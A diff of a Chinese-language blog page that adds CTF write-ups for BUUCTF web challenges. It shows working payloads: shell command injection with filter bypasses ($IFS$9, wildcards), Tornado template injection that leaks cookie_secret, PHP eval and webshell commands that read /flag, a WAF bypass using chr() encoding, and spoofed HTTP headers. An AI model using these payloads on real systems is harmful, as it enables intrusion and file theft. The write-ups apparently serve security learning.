@@ -74,7 +74,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">2.7k</span>
+            <span class="post-count">3.7k</span>
         </span>
     </span>
 
@@ -83,7 +83,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">12 分钟</span>
+            <span class="post-count">16 分钟</span>
         </span>
     </span>
 </div>
@@ -235,6 +235,77 @@ PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符
 <p>直接cat flag.php 不行 估计是flag被过滤了使用变量拼接  发现空格被过滤 使用 $IFS$9 绕过</p>
 <p>payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$9fla$a.php</span><br></pre></td></tr></table></figure>
+<h2 id="ACTF2020-新生赛-Exec"><a class="header-anchor" href="#ACTF2020-新生赛-Exec">¶</a>[ACTF2020 新生赛]Exec</h2>
+<p>发现没过滤空格也没过滤分号 直接查看根目录发先flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls &#x2F;;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210117113243979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat &#x2F;f*;</span><br></pre></td></tr></table></figure>
+<h2 id="护网杯-2018-easy-tornado"><a class="header-anchor" href="#护网杯-2018-easy-tornado">¶</a>[护网杯 2018]easy_tornado</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Orz.txt 进去提示是 render()</span><br><span class="line">hint.txt 进去提示是 md5(cookie_secret + md5(filename))</span><br><span class="line">flag.txt 进去提示是 &#x2F;fllllllllllag</span><br></pre></td></tr></table></figure>
+<p>注意查看 url的格式</p>
+<p><code>http://f3935217-6a95-491e-835b-2d172cfd9138.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=980fa5e6f1ece480d174ae0354c9655b</code></p>
+<p>查了一下 tornado这个框架</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tornado是一种 Web 服务器软件的开源版本。Tornado 和主流Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。</span><br><span class="line">得利于其非阻塞的方式和对epoll的运用，Tornado 每秒可以处理数以千计的连接，因此 Tornado 是实时 Web 服务的一个 理想框架。</span><br></pre></td></tr></table></figure>
+<p>输入了不存在的地址 发现有报错</p>
+<p>感觉是报错模板注入了</p>
+<p>不知道要怎么读到  cookie_secret 这个变量</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/83999.html">服务端模板注入攻击 （SSTI）之浅析</a></p>
+<p><code>/error?msg=&#123;&#123;1&#125;&#125;</code> 确实可以执行，确定是SSTI，这个 <code>( ) [ ] _</code> 全给过滤了，看来只能想别的办法了。。</p>
+<p>通过膜拜大佬博客发现cookie_secret在Application对象settings属性中，还发现self.application.settings有一个<a target="_blank" rel="noopener" href="https://tornado.readthedocs.io/en/latest/web.html#tornado.web.RequestHandler.settings">别名</a></p>
+<p>handler指向的处理当前这个页面的RequestHandler对象，<br>
+RequestHandler.settings指向self.application.settings，<br>
+因此handler.settings指向RequestHandler.application.settings。</p>
+<p>构造payload获取cookie_secret</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后根据<code>md5(cookie_secret+md5(filename))</code>，得到/fllllllllllllag访问的哈希，最后拿到flag</p>
+<h2 id="极客大挑战-2019-Knife"><a class="header-anchor" href="#极客大挑战-2019-Knife">¶</a>[极客大挑战 2019]Knife</h2>
+<p>打开题目 发现页面给了一句话</p>
+<p><img src="https://img-blog.csdnimg.cn/20210117231903596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Syc&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure>
+<h2 id="RoarCTF-2019-Easy-Calc"><a class="header-anchor" href="#RoarCTF-2019-Easy-Calc">¶</a>[RoarCTF 2019]Easy Calc</h2>
+<p>打开题目 查看源代码</p>
+<p>发现有calc.php 打开发现waf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#39;num&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line">        $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&#39;echo &#39;.$str.&#39;;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="解题步骤"><a class="header-anchor" href="#解题步骤">¶</a>解题步骤</h3>
+<p>先列出根目录文件 发现flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">? num&#x3D;print_r(scandir(&#39;&#x2F;&#39;)); 这里由于单引号被过滤了，那就用chr()绕过，chr(47)就是斜杠&#x2F;  </span><br><span class="line">? num&#x3D;print_r(scandir(chr(47)));</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210117235033293.png" alt="在这里插入图片描述"></p>
+<p>读取flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">? num&#x3D;print_r(file_get_contents(&#39;&#x2F;flagg&#39;));</span><br><span class="line">这里&#x2F;&#x3D;chr(47),f&#x3D;chr(102),l&#x3D;chr(49),a&#x3D;chr(97),g&#x3D;chr(103),g&#x3D;chr(103)来进行绕过</span><br><span class="line">? num&#x3D;print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</span><br></pre></td></tr></table></figure>
+<h3 id="解析"><a class="header-anchor" href="#解析">¶</a>解析</h3>
+<p>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
+<p>PHP的字符串解析特性:</p>
+<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.删除空白符</span><br><span class="line">2.将某些字符转换为下划线（包括空格）</span><br></pre></td></tr></table></figure>
+<p>【当waf不让你过的时候，php却可以让你过】</p>
+<p><strong>还有一种方法 HTTP请求走私 我太菜了 还没学会 后面再补吧</strong></p>
+<p>可参考:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/chrysanthemum/p/11757363.html">https://www.cnblogs.com/chrysanthemum/p/11757363.html</a></p>
+<h2 id="极客大挑战-2019-Http"><a class="header-anchor" href="#极客大挑战-2019-Http">¶</a>[极客大挑战 2019]Http</h2>
+<p>这题早有耳闻  入门的时候做过 考点肯定就是利用bp改包伪造请求</p>
+<p>右键源代码 发现提示</p>
+<p><img src="https://img-blog.csdnimg.cn/20210118000755505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>打开提示</p>
+<p><img src="https://img-blog.csdnimg.cn/2021011800082519.png" alt="在这里插入图片描述"></p>
+<p>说明要改</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: https:&#x2F;&#x2F;www.Sycsecret.com</span><br></pre></td></tr></table></figure>
+<p>又提示</p>
+<p><img src="C:%5CUsers%5Cwh1tecell%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210118001145173.png" alt="image-20210118001145173"></p>
+<p>再改</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &quot;Syclover&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210118001403888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>再改</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<p>放一张最终的图</p>
+<p><img src="https://img-blog.csdnimg.cn/20210118001454919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="极客大挑战-2019-PHP"><a class="header-anchor" href="#极客大挑战-2019-PHP">¶</a>[极客大挑战 2019]PHP</h2>
+<p>打开题目开到这个  忍不住扫呀</p>
+<p><img src="https://img-blog.csdnimg.cn/20210118001741107.png" alt="在这里插入图片描述"></p>
+<p>试了 www.zip 还真对了。。。 不愧是我。。。</p>
+<p>打开class.php一看源码</p>
+<p>反序列没错了</p>
  
       <!-- reward -->
       
